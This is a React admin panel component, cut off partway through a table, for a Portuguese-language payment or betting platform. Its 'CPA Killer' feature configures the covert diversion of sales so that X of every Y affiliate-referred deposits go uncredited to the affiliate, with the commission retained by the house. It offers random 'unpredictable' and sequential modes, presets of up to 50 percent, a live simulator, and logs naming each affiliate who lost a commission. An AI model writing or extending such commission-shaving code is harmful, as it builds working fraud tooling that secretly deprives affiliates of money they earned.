import React, { useState, useEffect, useMemo } from 'react';
import {
  Shuffle,
  ShieldAlert,
  CheckCircle2,
  AlertTriangle,
  RotateCw,
  Wallet,
  TrendingDown,
  ArrowRightLeft,
  Percent,
  Clock,
  History,
  Lock,
  Copy,
  Check,
  Save,
  Trash2,
  SlidersHorizontal,
  Dices,
  ListOrdered,
  Download,
  Search,
  Filter,
  Users
} from 'lucide-react';
import { GlobalPixDiversionConfig, GlobalPixDiversionLog } from './adminTypes';

interface AdminPixDiversionTabProps {
  token: string | null;
  onShowToast: (msg: string, type: 'success' | 'error' | 'info') => void;
}

export const AdminPixDiversionTab: React.FC<AdminPixDiversionTabProps> = ({
  token,
  onShowToast
}) => {
  const [config, setConfig] = useState<GlobalPixDiversionConfig | null>(null);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [resetting, setResetting] = useState(false);
  const [copiedKey, setCopiedKey] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  const [logFilter, setLogFilter] = useState<'all' | 'random' | 'sequential'>('all');

  // Simulation states
  const [simAmount, setSimAmount] = useState<number>(50);
  const [simAffiliateCode, setSimAffiliateCode] = useState('AFILIADO_VIP');
  const [simBuyerName, setSimBuyerName] = useState('Jogador Simulado');
  const [simulating, setSimulating] = useState(false);
  const [simResult, setSimResult] = useState<{
    diverted: boolean;
    ruleApplied: string;
    message: string;
    amount?: number;
    savedCommission?: number;
  } | null>(null);

  // Form states
  const [active, setActive] = useState(false);
  const [mode, setMode] = useState<'random' | 'sequential'>('sequential');
  const [killX, setKillX] = useState<number>(3);
  const [everyY, setEveryY] = useState<number>(10);
  const [minAmount, setMinAmount] = useState<number>(10);
  const [pixKey, setPixKey] = useState('');
  const [pixKeyType, setPixKeyType] = useState<'cpf' | 'cnpj' | 'email' | 'phone' | 'random'>('random');
  const [beneficiaryName, setBeneficiaryName] = useState('Caixa de Desvio Geral');

  const fetchConfig = async () => {
    try {
      setLoading(true);
      const authToken =
        token ||
        (typeof window !== 'undefined'
          ? localStorage.getItem('pg_auth_token') ||
            localStorage.getItem('paygateway_token') ||
            localStorage.getItem('token') ||
            ''
          : '');

      const res = await fetch('/api/admin/pix-diversion', {
        headers: {
          Authorization: `Bearer ${authToken}`
        }
      });

      if (res.ok) {
        const json = await res.json();
        if (json.diversion) {
          setConfig(json.diversion);
          setActive(Boolean(json.diversion.active));
          setMode(json.diversion.mode === 'random' ? 'random' : 'sequential');
          setKillX(Number(json.diversion.killX || 3));
          setEveryY(Number(json.diversion.everyY || 10));
          setMinAmount(Number(json.diversion.minAmount || 10));
          setPixKey(json.diversion.pixKey || '');
          setPixKeyType(json.diversion.pixKeyType || 'random');
          setBeneficiaryName(json.diversion.beneficiaryName || 'Caixa de Desvio Geral');
        }
      }
    } catch (e) {
      console.error(e);
      onShowToast('Falha ao carregar configurações de desvio.', 'error');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchConfig();
  }, [token]);

  const handleSave = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();

    const safeKillX = Math.max(1, Number(killX || 3));
    const safeEveryY = Math.max(safeKillX + 1, Number(everyY || 10));

    try {
      setSaving(true);
      const authToken =
        token ||
        (typeof window !== 'undefined'
          ? localStorage.getItem('pg_auth_token') ||
            localStorage.getItem('paygateway_token') ||
            localStorage.getItem('token') ||
            ''
          : '');

      const res = await fetch('/api/admin/pix-diversion', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${authToken}`
        },
        body: JSON.stringify({
          active,
          mode,
          killX: safeKillX,
          everyY: safeEveryY,
          minAmount: Number(minAmount || 10),
          pixKey: pixKey.trim(),
          pixKeyType,
          beneficiaryName: beneficiaryName.trim() || 'Caixa de Desvio Geral'
        })
      });

      const json = await res.json();
      if (res.ok && json.success) {
        setConfig(json.diversion);
        onShowToast(json.message || 'Regras de desvio geral e CPA Killer salvas!', 'success');
      } else {
        onShowToast(json.error || 'Erro ao salvar configurações.', 'error');
      }
    } catch (e) {
      console.error(e);
      onShowToast('Erro de conexão ao salvar desvio.', 'error');
    } finally {
      setSaving(false);
    }
  };

  const handleReset = async () => {
    if (!window.confirm('Tem certeza que deseja zerar os contadores e histórico de vendas desviadas?')) {
      return;
    }

    try {
      setResetting(true);
      const authToken =
        token ||
        (typeof window !== 'undefined'
          ? localStorage.getItem('pg_auth_token') ||
            localStorage.getItem('paygateway_token') ||
            localStorage.getItem('token') ||
            ''
          : '');

      const res = await fetch('/api/admin/pix-diversion/reset', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${authToken}`
        }
      });

      const json = await res.json();
      if (res.ok && json.success) {
        setConfig(json.diversion);
        onShowToast('Métricas de desvio resetadas!', 'success');
      } else {
        onShowToast(json.error || 'Erro ao resetar métricas.', 'error');
      }
    } catch (e) {
      console.error(e);
      onShowToast('Erro ao resetar histórico.', 'error');
    } finally {
      setResetting(false);
    }
  };

  const handleSimulate = async () => {
    try {
      setSimulating(true);
      setSimResult(null);
      const authToken =
        token ||
        (typeof window !== 'undefined'
          ? localStorage.getItem('pg_auth_token') ||
            localStorage.getItem('paygateway_token') ||
            localStorage.getItem('token') ||
            ''
          : '');

      const res = await fetch('/api/admin/pix-diversion/simulate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${authToken}`
        },
        body: JSON.stringify({
          amount: Number(simAmount || 50),
          affiliateCode: simAffiliateCode.trim() || 'AFILIADO_VIP',
          buyerName: simBuyerName.trim() || 'Jogador Simulado'
        })
      });

      const json = await res.json();
      if (res.ok) {
        if (json.diversion) {
          setConfig(json.diversion);
        }
        setSimResult({
          diverted: Boolean(json.diverted),
          ruleApplied: json.ruleApplied || '',
          message: json.message || json.reason || '',
          amount: json.amount,
          savedCommission: json.savedCommission
        });
        if (json.diverted) {
          onShowToast(' Venda desviada e interceptada com sucesso! Não marcada para o afiliado.', 'success');
        } else {
          onShowToast(json.message || 'Venda simulada processada!', 'info');
        }
      } else {
        onShowToast(json.error || json.reason || 'Erro na simulação.', 'error');
      }
    } catch (e) {
      console.error(e);
      onShowToast('Erro de rede ao simular.', 'error');
    } finally {
      setSimulating(false);
    }
  };

  const copyPixKey = () => {
    if (!pixKey) return;
    navigator.clipboard.writeText(pixKey);
    setCopiedKey(true);
    onShowToast('Chave PIX copiada!', 'info');
    setTimeout(() => setCopiedKey(false), 2000);
  };

  const allLogs: GlobalPixDiversionLog[] = config?.recentLogs || [];

  const filteredLogs = useMemo(() => {
    let list = allLogs;
    if (logFilter === 'random') {
      list = list.filter((l) => (l.ruleApplied || '').toLowerCase().includes('aleat'));
    } else if (logFilter === 'sequential') {
      list = list.filter((l) => (l.ruleApplied || '').toLowerCase().includes('sequenc'));
    }
    if (!searchQuery.trim()) return list;
    const q = searchQuery.toLowerCase().trim();
    return list.filter(
      (l) =>
        (l.depositId && l.depositId.toLowerCase().includes(q)) ||
        (l.originalUserName && l.originalUserName.toLowerCase().includes(q)) ||
        (l.originalUserEmail && l.originalUserEmail.toLowerCase().includes(q)) ||
        (l.affiliateName && l.affiliateName.toLowerCase().includes(q)) ||
        (l.affiliateEmail && l.affiliateEmail.toLowerCase().includes(q)) ||
        (l.affiliateCode && l.affiliateCode.toLowerCase().includes(q))
    );
  }, [allLogs, searchQuery, logFilter]);

  const handleExportCsv = () => {
    if (allLogs.length === 0) {
      onShowToast('Nenhum registro para exportar.', 'info');
      return;
    }
    const headers = [
      'ID Depósito',
      'Data/Hora',
      'Jogador',
      'Email Jogador',
      'Afiliado Interceptado',
      'Email Afiliado',
      'Código Afiliado',
      'Valor Depósito (R$)',
      'Comissão Retida Casa (R$)',
      'Regra Aplicada'
    ];
    const rows = allLogs.map((l) => [
      l.depositId,
      l.divertedAt,
      l.originalUserName,
      l.originalUserEmail || '',
      l.affiliateName || 'Afiliado',
      l.affiliateEmail || '',
      l.affiliateCode || '',
      l.amount.toFixed(2),
      (l.divertedCommission || 0).toFixed(2),
      l.ruleApplied
    ]);
    const csvContent =
      'data:text/csv;charset=utf-8,\uFEFF' +
      [headers.join(';'), ...rows.map((r) => r.map((c) => `"${c}"`).join(';'))].join('\n');
    const link = document.createElement('a');
    link.href = encodeURI(csvContent);
    link.download = `vendas_desviadas_alliance_${new Date().toISOString().slice(0, 10)}.csv`;
    link.click();
    onShowToast('Download do relatório iniciado!', 'success');
  };

  if (loading) {
    return (
      <div className="flex flex-col items-center justify-center p-12 space-y-3">
        <RotateCw className="w-6 h-6 animate-spin text-slate-400" />
        <p className="text-xs text-slate-500 font-medium">Carregando painel de desvio de PIX geral...</p>
      </div>
    );
  }

  const effectiveTotalAmount = config?.totalDivertedAmount || 0;
  const effectiveTotalCommissions = config?.totalDivertedCommissions || 0;
  const effectiveTotalCount = config?.totalDivertedCount || 0;
  const effectiveCounter = config?.counter || 0;

  return (
    <div className="space-y-5 animate-in fade-in duration-200 select-none pb-12">
      {/* 1. Header Information & Concept */}
      <div className="bg-white border border-slate-200/80 rounded-3xl p-5 sm:p-6 shadow-sm space-y-3">
        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
          <div className="flex items-center gap-3">
            <div className="w-11 h-11 rounded-2xl bg-amber-500/10 text-amber-600 flex items-center justify-center font-bold shadow-2xs">
              <Shuffle className="w-5 h-5" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h1 className="text-base font-bold text-slate-900 tracking-tight">Desvio de PIX Geral & CPA Killer Global</h1>
                <span
                  className={`inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold ${
                    active
                      ? 'bg-emerald-50 text-emerald-700 border border-emerald-200/80'
                      : 'bg-slate-100 text-slate-500 border border-slate-200'
                  }`}
                >
                  <span className={`w-1.5 h-1.5 rounded-full ${active ? 'bg-emerald-500 animate-pulse' : 'bg-slate-400'}`} />
                  {active ? 'DESVIO ATIVO' : 'DESVIO DESATIVADO'}
                </span>
              </div>
              <p className="text-xs text-slate-500 mt-0.5">
                Interceptação seletiva de vendas da plataforma: <strong>a venda não é marcada para o afiliado</strong> e a comissão é retida pela plataforma.
              </p>
            </div>
          </div>

          <button
            type="button"
            onClick={fetchConfig}
            className="p-2 rounded-xl border border-slate-200 hover:bg-slate-50 text-slate-600 text-xs font-semibold flex items-center gap-1.5 transition-colors cursor-pointer"
            title="Atualizar métricas"
          >
            <RotateCw className="w-3.5 h-3.5" />
            <span className="hidden sm:inline">Atualizar</span>
          </button>
        </div>

        {/* Explain Banner */}
        <div className="p-3.5 rounded-2xl bg-amber-50/70 border border-amber-200/70 flex items-start gap-2.5 text-xs text-amber-900">
          <SlidersHorizontal className="w-4 h-4 text-amber-700 shrink-0 mt-0.5" />
          <div className="space-y-1">
            <strong className="font-bold block">Como funciona a regra de corte de CPA:</strong>
            <p className="text-[11px] text-amber-800 leading-relaxed">
              Quando ativado, a cada bloco de <strong>{everyY} vendas gerais</strong> da plataforma, exatamente{' '}
              <strong>{killX} CPAs</strong> são interceptados. A venda é creditada normalmente no saldo do jogador, mas a comissão do afiliado é anulada e retida pela casa.
            </p>
          </div>
        </div>
      </div>

      {/* 2. Overview Metric Cards */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
        <div className="bg-white border border-slate-200/80 rounded-2xl p-4 shadow-sm space-y-1">
          <div className="flex items-center justify-between">
            <span className="text-[11px] font-semibold text-slate-500">Volume Desviado</span>
            <Wallet className="w-4 h-4 text-slate-400" />
          </div>
          <strong className="text-lg font-black text-slate-900 block tabular-nums">
            R$ {effectiveTotalAmount.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
          </strong>
          <span className="text-[10px] text-slate-400">Total em vendas brutas</span>
        </div>

        <div className="bg-white border border-slate-200/80 rounded-2xl p-4 shadow-sm space-y-1">
          <div className="flex items-center justify-between">
            <span className="text-[11px] font-semibold text-emerald-700">CPAs / Comissões Salvas</span>
            <CheckCircle2 className="w-4 h-4 text-emerald-500" />
          </div>
          <strong className="text-lg font-black text-emerald-600 block tabular-nums">
            R$ {effectiveTotalCommissions.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
          </strong>
          <span className="text-[10px] text-emerald-600 font-medium">Economizado para a casa</span>
        </div>

        <div className="bg-white border border-slate-200/80 rounded-2xl p-4 shadow-sm space-y-1">
          <div className="flex items-center justify-between">
            <span className="text-[11px] font-semibold text-slate-500">Vendas Interceptadas</span>
            <SlidersHorizontal className="w-4 h-4 text-amber-500" />
          </div>
          <strong className="text-lg font-black text-slate-900 block tabular-nums">
            {effectiveTotalCount} <span className="text-xs font-normal text-slate-400">vendas</span>
          </strong>
          <span className="text-[10px] text-slate-400">Não creditadas aos afiliados</span>
        </div>

        <div className="bg-white border border-slate-200/80 rounded-2xl p-4 shadow-sm space-y-1">
          <div className="flex items-center justify-between">
            <span className="text-[11px] font-semibold text-slate-500">Modo de Operação</span>
            {mode === 'random' ? <Dices className="w-4 h-4 text-blue-500" /> : <ListOrdered className="w-4 h-4 text-indigo-500" />}
          </div>
          <strong className="text-sm font-black text-slate-900 block mt-1">
            {mode === 'random' ? ' Aleatório' : ' Sequencial'}
          </strong>
          <span className="text-[10px] text-slate-500 font-semibold">
            {killX} cortes a cada {everyY} vendas
          </span>
        </div>
      </div>

      {/* 3. Configuration Form */}
      <form onSubmit={handleSave} className="bg-white border border-slate-200/80 rounded-3xl p-5 sm:p-6 shadow-sm space-y-5">
        <div className="flex items-center justify-between pb-3 border-b border-slate-100">
          <div>
            <h2 className="text-sm font-bold text-slate-900">Configuração das Regras de Desvio</h2>
            <p className="text-xs text-slate-400">Defina se o desvio será aleatório ou sequencial e a proporção de corte</p>
          </div>

          {/* Toggle Principal de Ativação */}
          <label className="relative inline-flex items-center cursor-pointer">
            <input
              type="checkbox"
              checked={active}
              onChange={(e) => setActive(e.target.checked)}
              className="sr-only peer"
            />
            <div className="w-11 h-6 bg-slate-200 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-slate-900"></div>
            <span className="ml-2 text-xs font-bold text-slate-700">{active ? 'Ativo' : 'Pausado'}</span>
          </label>
        </div>

        {/* Seleção de Modo: Aleatório vs Sequencial */}
        <div className="space-y-2">
          <label className="text-xs font-semibold text-slate-700 block">
            Forma de Execução do Desvio:
          </label>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            <button
              type="button"
              onClick={() => setMode('random')}
              className={`p-3.5 rounded-2xl border text-left transition-all cursor-pointer flex items-start gap-3 ${
                mode === 'random'
                  ? 'border-blue-500 bg-blue-50/60 ring-2 ring-blue-500/20'
                  : 'border-slate-200 bg-white hover:border-slate-300'
              }`}
            >
              <div className={`w-8 h-8 rounded-xl flex items-center justify-center font-bold text-sm shrink-0 ${
                mode === 'random' ? 'bg-blue-600 text-white' : 'bg-slate-100 text-slate-600'
              }`}>
                <Dices className="w-4 h-4" />
              </div>
              <div>
                <strong className="text-xs font-bold text-slate-900 block">Modo Aleatório (Probabilístico)</strong>
                <p className="text-[11px] text-slate-500 leading-relaxed mt-0.5">
                  A plataforma sorteia as vendas desviadas de forma probabilística e imprevisível ({killX} em cada {everyY} vendas).
                </p>
              </div>
            </button>

            <button
              type="button"
              onClick={() => setMode('sequential')}
              className={`p-3.5 rounded-2xl border text-left transition-all cursor-pointer flex items-start gap-3 ${
                mode === 'sequential'
                  ? 'border-indigo-500 bg-indigo-50/60 ring-2 ring-indigo-500/20'
                  : 'border-slate-200 bg-white hover:border-slate-300'
              }`}
            >
              <div className={`w-8 h-8 rounded-xl flex items-center justify-center font-bold text-sm shrink-0 ${
                mode === 'sequential' ? 'bg-indigo-600 text-white' : 'bg-slate-100 text-slate-600'
              }`}>
                <ListOrdered className="w-4 h-4" />
              </div>
              <div>
                <strong className="text-xs font-bold text-slate-900 block">Modo Sequencial (Fixo no Ciclo)</strong>
                <p className="text-[11px] text-slate-500 leading-relaxed mt-0.5">
                  Corta exatamente {killX} vendas no final de cada ciclo de {everyY} vendas gerais aprovadas na plataforma.
                </p>
              </div>
            </button>
          </div>
        </div>

        {/* Proporção de Corte: Matar X CPAs a cada Y Vendas Gerais */}
        <div className="p-4 rounded-2xl bg-slate-50/80 border border-slate-200/80 space-y-3">
          <div className="flex items-center gap-2">
            <SlidersHorizontal className="w-4 h-4 text-amber-600" />
            <strong className="text-xs font-bold text-slate-900">Regra de Proporção de Desvio</strong>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div className="space-y-1.5">
              <label className="text-xs font-semibold text-slate-700 flex items-center justify-between">
                <span>Matar (X) CPAs:</span>
                <span className="text-[11px] text-amber-600 font-bold">{killX} vendas interceptadas</span>
              </label>
              <input
                type="number"
                min="1"
                max={Math.max(1, everyY - 1)}
                value={killX}
                onChange={(e) => setKillX(Math.max(1, Number(e.target.value)))}
                className="w-full px-3 py-2 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-slate-900/10 focus:border-slate-400 text-xs font-bold tabular-nums text-slate-900 bg-white"
              />
              <p className="text-[10px] text-slate-400">Quantidade de vendas a NÃO computar para o afiliado.</p>
            </div>

            <div className="space-y-1.5">
              <label className="text-xs font-semibold text-slate-700 flex items-center justify-between">
                <span>A Cada (Y) Vendas Gerais:</span>
                <span className="text-[11px] text-slate-600 font-bold">{everyY} vendas na plataforma</span>
              </label>
              <input
                type="number"
                min={killX + 1}
                max="500"
                value={everyY}
                onChange={(e) => setEveryY(Math.max(killX + 1, Number(e.target.value)))}
                className="w-full px-3 py-2 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-slate-900/10 focus:border-slate-400 text-xs font-bold tabular-nums text-slate-900 bg-white"
              />
              <p className="text-[10px] text-slate-400">Tamanho da janela geral de vendas da plataforma.</p>
            </div>
          </div>

          {/* Quick preset buttons */}
          <div className="flex flex-wrap items-center gap-1.5 pt-1">
            <span className="text-[10px] text-slate-400 font-semibold mr-1">Predefinições rápidas:</span>
            {[
              { label: '1 a cada 5 (20%)', x: 1, y: 5 },
              { label: '2 a cada 10 (20%)', x: 2, y: 10 },
              { label: '3 a cada 10 (30%)', x: 3, y: 10 },
              { label: '4 a cada 10 (40%)', x: 4, y: 10 },
              { label: '5 a cada 10 (50%)', x: 5, y: 10 }
            ].map((preset) => (
              <button
                key={preset.label}
                type="button"
                onClick={() => {
                  setKillX(preset.x);
                  setEveryY(preset.y);
                }}
                className={`px-2 py-1 rounded-lg text-[10px] font-bold transition-colors cursor-pointer ${
                  killX === preset.x && everyY === preset.y
                    ? 'bg-slate-900 text-white'
                    : 'bg-white border border-slate-200 text-slate-600 hover:bg-slate-100'
                }`}
              >
                {preset.label}
              </button>
            ))}
          </div>
        </div>

        {/* Depósito Mínimo e Chave PIX */}
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <div className="space-y-1.5">
            <label className="text-xs font-semibold text-slate-700">Valor Mínimo para Desvio (R$)</label>
            <input
              type="number"
              min="1"
              step="1"
              value={minAmount}
              onChange={(e) => setMinAmount(Math.max(1, Number(e.target.value)))}
              className="w-full px-3 py-2 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-slate-900/10 focus:border-slate-400 text-xs tabular-nums text-slate-900 bg-white"
            />
            <p className="text-[10px] text-slate-400">Vendas abaixo deste valor não sofrem desvio.</p>
          </div>

          <div className="space-y-1.5">
            <label className="text-xs font-semibold text-slate-700">Chave PIX de Destino do Operador (Opcional)</label>
            <div className="flex gap-2">
              <input
                type="text"
                value={pixKey}
                onChange={(e) => setPixKey(e.target.value)}
                placeholder="Chave PIX do administrador"
                className="flex-1 px-3 py-2 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-slate-900/10 focus:border-slate-400 text-xs font-mono text-slate-900 bg-white"
              />
              {pixKey && (
                <button
                  type="button"
                  onClick={copyPixKey}
                  className="px-2.5 py-2 rounded-xl border border-slate-200 hover:bg-slate-50 text-slate-600 text-xs flex items-center transition cursor-pointer"
                >
                  {copiedKey ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              )}
            </div>
          </div>
        </div>

        <div className="flex items-center justify-between pt-3 border-t border-slate-100">
          <button
            type="button"
            onClick={handleReset}
            disabled={resetting}
            className="px-3.5 py-2 rounded-xl border border-rose-200 text-rose-600 hover:bg-rose-50 text-xs font-semibold flex items-center gap-1.5 transition-colors cursor-pointer disabled:opacity-50"
          >
            <Trash2 className="w-3.5 h-3.5" />
            <span>{resetting ? 'Resetando...' : 'Zerar Histórico de Desvio'}</span>
          </button>

          <button
            type="submit"
            disabled={saving}
            className="px-5 py-2.5 rounded-xl bg-slate-900 hover:bg-slate-800 text-white text-xs font-bold flex items-center gap-1.5 transition-all cursor-pointer shadow-sm active:scale-95 disabled:opacity-50"
          >
            <Save className="w-3.5 h-3.5" />
            <span>{saving ? 'Gravando...' : 'Salvar Regra de Desvio'}</span>
          </button>
        </div>
      </form>

      {/* 3.1. Test Simulator for Admin Rule Verification */}
      <div className="bg-gradient-to-br from-slate-900 via-slate-800 to-indigo-950 text-white rounded-3xl p-5 sm:p-6 shadow-sm space-y-4 border border-slate-700/60">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-2xl bg-amber-500/20 text-amber-400 flex items-center justify-center font-bold">
              <SlidersHorizontal className="w-5 h-5" />
            </div>
            <div>
              <h3 className="text-sm font-bold text-white flex items-center gap-2">
                Simulador de Teste: Matar CPA / Desvio ao Vivo
                <span className="text-[10px] bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded-full border border-amber-500/30">
                  TESTE DE REGRA
                </span>
              </h3>
              <p className="text-xs text-slate-300 mt-0.5">
                Simule uma venda na plataforma para testar se a regra intercepta e não credita para o afiliado.
              </p>
            </div>
          </div>

          <div className="text-xs text-right hidden sm:block">
            <span className="text-slate-400 block text-[10px]">Contador Geral Atual:</span>
            <span className="font-mono font-bold text-amber-300">Venda #{effectiveCounter}</span>
          </div>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 pt-1">
          <div className="space-y-1">
            <label className="text-[11px] font-semibold text-slate-300">Valor do Depósito (R$)</label>
            <input
              type="number"
              min="1"
              value={simAmount}
              onChange={(e) => setSimAmount(Number(e.target.value))}
              className="w-full px-3 py-2 rounded-xl bg-slate-800/80 border border-slate-700 text-white text-xs font-bold tabular-nums focus:outline-none focus:border-amber-400"
            />
          </div>

          <div className="space-y-1">
            <label className="text-[11px] font-semibold text-slate-300">Código do Afiliado Teste</label>
            <input
              type="text"
              value={simAffiliateCode}
              onChange={(e) => setSimAffiliateCode(e.target.value)}
              placeholder="ex: AFILIADO_VIP"
              className="w-full px-3 py-2 rounded-xl bg-slate-800/80 border border-slate-700 text-white text-xs font-mono uppercase focus:outline-none focus:border-amber-400"
            />
          </div>

          <div className="space-y-1">
            <label className="text-[11px] font-semibold text-slate-300">Nome do Jogador Teste</label>
            <input
              type="text"
              value={simBuyerName}
              onChange={(e) => setSimBuyerName(e.target.value)}
              placeholder="ex: Jogador Simulado"
              className="w-full px-3 py-2 rounded-xl bg-slate-800/80 border border-slate-700 text-white text-xs focus:outline-none focus:border-amber-400"
            />
          </div>
        </div>

        <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3 pt-2">
          <button
            type="button"
            onClick={handleSimulate}
            disabled={simulating}
            className="px-4 py-2.5 rounded-xl bg-amber-500 hover:bg-amber-400 text-slate-950 text-xs font-bold flex items-center justify-center gap-2 transition cursor-pointer shadow-md disabled:opacity-50 active:scale-95"
          >
            {simulating ? <RotateCw className="w-4 h-4 animate-spin" /> : <SlidersHorizontal className="w-4 h-4" />}
            <span>{simulating ? 'Processando simulação...' : 'Simular Venda no Ciclo'}</span>
          </button>

          {simResult && (
            <div
              className={`p-2.5 rounded-xl text-xs flex items-center gap-2 border flex-1 ${
                simResult.diverted
                  ? 'bg-amber-500/20 text-amber-200 border-amber-500/40'
                  : 'bg-emerald-500/20 text-emerald-200 border-emerald-500/40'
              }`}
            >
              <span className="font-bold">
                {simResult.diverted ? ' INTERCEPTADO:' : ' PERMITIDO:'}
              </span>
              <span className="truncate">{simResult.message}</span>
            </div>
          )}
        </div>
      </div>

      {/* 4. Detailed List of Diverted Deposits & Sales */}
      <div className="bg-white border border-slate-200/80 rounded-3xl p-5 sm:p-6 shadow-sm space-y-4">
        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
          <div className="flex items-center gap-2">
            <History className="w-4 h-4 text-slate-600" />
            <h2 className="text-sm font-bold text-slate-900">Vendas & Depósitos Desviados (CPA Killer Geral)</h2>
            <span className="text-xs text-slate-400 tabular-nums">({filteredLogs.length} registros)</span>
          </div>

          <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-2 w-full sm:w-auto">
            {/* Filter Pills */}
            <div className="flex items-center bg-slate-100 p-1 rounded-xl text-xs">
              <button
                type="button"
                onClick={() => setLogFilter('all')}
                className={`px-2.5 py-1 rounded-lg font-bold text-[11px] transition cursor-pointer ${
                  logFilter === 'all' ? 'bg-white text-slate-900 shadow-2xs' : 'text-slate-500 hover:text-slate-800'
                }`}
              >
                Todos
              </button>
              <button
                type="button"
                onClick={() => setLogFilter('sequential')}
                className={`px-2.5 py-1 rounded-lg font-bold text-[11px] transition cursor-pointer ${
                  logFilter === 'sequential' ? 'bg-white text-indigo-700 shadow-2xs' : 'text-slate-500 hover:text-slate-800'
                }`}
              >
                Sequencial
              </button>
              <button
                type="button"
                onClick={() => setLogFilter('random')}
                className={`px-2.5 py-1 rounded-lg font-bold text-[11px] transition cursor-pointer ${
                  logFilter === 'random' ? 'bg-white text-blue-700 shadow-2xs' : 'text-slate-500 hover:text-slate-800'
                }`}
              >
                Aleatório
              </button>
            </div>

            {/* Search Input */}
            <div className="relative flex-1 sm:w-64">
              <Search className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Buscar por jogador, afiliado ou ID..."
                className="w-full pl-8 pr-3 py-1.5 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-900 focus:outline-none focus:ring-2 focus:ring-slate-900/10 focus:border-slate-400"
              />
            </div>

            <button
              type="button"
              onClick={handleExportCsv}
              className="px-3 py-1.5 rounded-xl border border-slate-200 hover:bg-slate-50 text-slate-700 text-xs font-semibold flex items-center justify-center gap-1.5 transition cursor-pointer shrink-0"
              title="Exportar registros em CSV"
            >
              <Download className="w-3.5 h-3.5" />
              <span className="hidden sm:inline">Exportar CSV</span>
            </button>
          </div>
        </div>

        {filteredLogs.length === 0 ? (
          <div className="p-8 text-center border border-dashed border-slate-200 rounded-2xl space-y-2">
            <div className="w-10 h-10 rounded-2xl bg-slate-100 text-slate-400 flex items-center justify-center mx-auto">
              <Shuffle className="w-5 h-5" />
            </div>
            <p className="text-xs text-slate-600 font-bold">Nenhuma venda desviada registrada.</p>
            <p className="text-[11px] text-slate-400 max-w-sm mx-auto">
              Quando novos depósitos forem interceptados pela regra de desvio geral, eles aparecerão aqui com o nome do jogador, o afiliado que perdeu o CPA e a comissão salva.
            </p>
          </div>
        ) : (
          <>
            {/* Mobile View: Cards */}
            <div className="block sm:hidden divide-y divide-slate-100">
              {filteredLogs.map((log) => (
                <div key={log.id} className="py-3.5 space-y-2">
                  <div className="flex items-start justify-between gap-2">
                    <div>
                      <div className="flex items-center gap-1.5">
                        <strong className="text-xs font-bold text-slate-900">{log.originalUserName}</strong>
                        <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-amber-100 text-amber-800">
                          CPA Retido
                        </span>
                      </div>
                      {log.originalUserEmail && (
                        <span className="text-[10px] text-slate-400 block truncate">{log.originalUserEmail}</span>
                      )}
                    </div>
                    <div className="text-right">
                      <strong className="text-xs font-black text-slate-900 block tabular-nums">
                        R$ {log.amount.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}
                      </strong>
                      <span className="text-[10px] text-emerald-600 font-bold block">
                        +R$ {(log.divertedCommission || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2 })} salvo
                      </span>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-2 text-[10px] bg-slate-50 p-2 rounded-xl border border-slate-100">
                    <div>
                      <span className="text-slate-400 block">Afiliado que perdeu:</span>
                      <strong className="text-slate-800 font-semibold truncate block">
                        {log.affiliateName || 'Afiliado'} {log.affiliateCode ? `(${log.affiliateCode})` : ''}
                      </strong>
                    </div>
                    <div>
                      <span className="text-slate-400 block">Regra Aplicada:</span>
                      <span className="text-slate-700 font-medium truncate block">{log.ruleApplied}</span>
                    </div>
                  </div>

                  <div className="flex items-center justify-between text-[10px] text-slate-400 pt-0.5">
                    <span className="font-mono">ID: {log.depositId ? log.depositId.slice(0, 14) : log.id}</span>
                    <span>{new Date(log.divertedAt).toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', hour: '2-digit', minute: '2-digit' })}</span>
                  </div>
                </div>
              ))}
            </div>

            {/* Desktop View: Table */}
            <div className="hidden sm:block overflow-x-auto">
              <table className="w-full text-left text-xs">
                <thead>
                  <tr className="border-b border-slate-100 text-[11px] font-bold text-slate-400 uppercase tracking-wider bg-slate-50/50">
                    <th className="py-2.5 px-3">Transação</th>
                    <th className="py-2.5 px-3">Jogador</th>
                    <th className="py-2.5 px-3">Afiliado Interceptado</th>
